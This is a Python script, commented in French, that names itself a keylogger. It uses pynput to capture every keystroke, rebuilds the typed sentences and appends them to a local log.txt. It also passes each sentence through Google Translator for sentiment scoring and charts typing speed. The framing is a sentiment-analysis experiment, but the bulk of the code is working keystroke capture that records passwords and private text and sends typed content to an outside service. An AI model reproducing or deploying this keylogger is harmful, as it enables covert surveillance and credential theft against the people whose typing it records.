import time
import matplotlib.pyplot as plt
from pynput import keyboard
import threading
import os
import nltk
from nltk.sentiment import SentimentIntensityAnalyzer
from deep_translator import GoogleTranslator

nltk.download('vader_lexicon')

analyseur_sentiments = SentimentIntensityAnalyzer()
traducteur = GoogleTranslator(source='fr', target='en')

phrase_en_cours = [] 
chemin_fichier = os.path.join(os.getcwd(), "log.txt")  
verrou = threading.Lock()  
programme_actif = True  

# Listes pour stocker les données à visualiser
sentiment_scores = []
typing_speeds = []

# Variables pour mesurer la vitesse de frappe
last_time = None

def traiter_touche(touche):
    global phrase_en_cours, programme_actif, last_time, typing_speeds
    try:
        current_time = time.time()  # Heure actuelle en secondes
        if last_time is not None:
            typing_speed = current_time - last_time  # Temps écoulé entre deux frappes
            typing_speeds.append(typing_speed)  # Ajouter la vitesse de frappe

        last_time = current_time  # Mettre à jour le dernier temps

        if hasattr(touche, 'char') and touche.char is not None:
            phrase_en_cours.append(touche.char)

        if touche.char in ".!?":
            phrase_complete = "".join(phrase_en_cours).strip()
            if phrase_complete:
                analyser_sentiment(phrase_complete) 
                enregistrer_phrase(phrase_complete)  
            phrase_en_cours.clear()  

    except AttributeError:
        if touche == keyboard.Key.space:
            phrase_en_cours.append(" ")
        elif touche == keyboard.Key.enter:
            phrase_en_cours.append("\n")
        elif touche == keyboard.Key.backspace and phrase_en_cours:
            phrase_en_cours.pop()
        elif touche == keyboard.Key.esc:
            print("\n[INFO] Arrêt du keylogger...")
            programme_actif = False
            return False
    print(f"Touche pressée: {touche}")

def analyser_sentiment(texte):
    try:
        texte_traduit = traducteur.translate(texte)
        scores_sentiments = analyseur_sentiments.polarity_scores(texte_traduit)
        score_global = scores_sentiments['compound']

        # Enregistrer le score de sentiment
        sentiment_scores.append(score_global)

        print("\n[ANALYSE DES SENTIMENTS]")
        print(f"Texte : {texte}")

        if score_global >= 0.05:
            print(f"[POSITIF] Score : {score_global:.2f}")
        elif score_global <= -0.05:
            print(f"[NÉGATIF] Score : {score_global:.2f}")
        else:
            print(f"[NEUTRE] Score : {score_global:.2f}")
    
    except Exception as e:
        print(f"[ERREUR] Impossible d'analyser le texte : {e}")

def enregistrer_phrase(texte):
    global chemin_fichier
    with verrou:
        with open(chemin_fichier, "a") as fichier:
            fichier.write(texte + "\n")

def start_keylogger():
    global programme_actif
    with keyboard.Listener(on_press=traiter_touche) as ecouteur_clavier:
        ecouteur_clavier.join()  

# Fonction pour afficher les graphiques des résultats
def afficher_graphique():
    # Visualisation des scores de sentiment
    plt.figure(figsize=(10, 5))

    # Tracer l'évolution des sentiments
    plt.subplot(2, 1, 1)  # 2 lignes, 1 colonne, 1er graphique
    plt.plot(sentiment_scores, marker='o', color='b', label='Score de sentiment')
    plt.title("Évolution des Sentiments")
    plt.xlabel("Lignes saisies")
    plt.ylabel("Score de Sentiment")
    plt.axhline(0, color='gray', linestyle='--', linewidth=1)  # Ligne de séparation
    plt.legend()

    # Tracer les vitesses de frappe
    plt.subplot(2, 1, 2)  # 2 lignes, 1 colonne, 2e graphique
    plt.plot(typing_speeds, marker='x', color='r', label='Vitesse de frappe (secondes)')
    plt.title("Vitesse de Frappe")
    plt.xlabel("Index des frappes")
    plt.ylabel("Temps entre les frappes (secondes)")
    plt.legend()

    plt.tight_layout()
    plt.show()

# Lancer le keylogger
start_keylogger()
afficher_graphique()

# Afficher les graphiques après l'exécution du keylogger
if sentiment_scores and typing_speeds:
    afficher_graphique()
    